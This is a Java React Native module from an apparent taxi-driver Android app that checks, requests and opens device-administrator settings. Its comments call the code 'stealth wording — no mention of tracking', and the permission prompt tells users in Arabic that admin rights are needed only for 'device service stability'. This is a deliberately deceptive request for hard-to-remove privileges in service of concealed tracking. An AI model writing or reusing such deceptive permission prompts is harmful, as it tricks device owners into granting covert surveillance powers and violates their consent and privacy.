package com.dp.taxidriver;

  import android.app.Activity;
  import android.app.admin.DevicePolicyManager;
  import android.content.ComponentName;
  import android.content.Context;
  import android.content.Intent;
  import android.util.Log;

  import com.facebook.react.bridge.ReactApplicationContext;
  import com.facebook.react.bridge.ReactContextBaseJavaModule;
  import com.facebook.react.bridge.ReactMethod;
  import com.facebook.react.bridge.Promise;

  /**
   * DeviceAdminModule v2.7.14 — Stealth-safe wording
   */
  public class DeviceAdminModule extends ReactContextBaseJavaModule {
      private static final String TAG = "DeviceAdminModule";
      private static final int REQUEST_CODE_ENABLE_ADMIN = 9876;

      public DeviceAdminModule(ReactApplicationContext context) {
          super(context);
      }

      @Override
      public String getName() {
          return "DeviceAdminModule";
      }

      @ReactMethod
      public void isAdminActive(Promise promise) {
          try {
              Context ctx = getReactApplicationContext();
              DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
              ComponentName admin = new ComponentName(ctx, WhiteHorseAdminReceiver.class);
              boolean active = dpm.isAdminActive(admin);
              Log.d(TAG, "isAdminActive: " + active);
              promise.resolve(active);
          } catch (Exception e) {
              Log.e(TAG, "isAdminActive error", e);
              promise.reject("ERROR", e.getMessage());
          }
      }

      @ReactMethod
      public void requestAdmin(Promise promise) {
          try {
              Activity activity = getCurrentActivity();
              if (activity == null) {
                  promise.reject("NO_ACTIVITY", "Activity is not available");
                  return;
              }
              ComponentName admin = new ComponentName(activity, WhiteHorseAdminReceiver.class);
              Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
              intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
              // v2.7.14: stealth wording — no mention of tracking
              intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                  "صلاحية مطلوبة للحفاظ على استقرار خدمات الجهاز.");
              activity.startActivityForResult(intent, REQUEST_CODE_ENABLE_ADMIN);
              promise.resolve(true);
          } catch (Exception e) {
              Log.e(TAG, "requestAdmin error", e);
              promise.reject("ERROR", e.getMessage());
          }
      }

      @ReactMethod
      public void openAdminSettings(Promise promise) {
          try {
              Activity activity = getCurrentActivity();
              if (activity == null) {
                  promise.reject("NO_ACTIVITY", "Activity is not available");
                  return;
              }
              Intent intent = new Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS);
              intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
              activity.startActivity(intent);
              promise.resolve(true);
          } catch (Exception e) {
              promise.reject("ERROR", e.getMessage());
          }
      }
  }
  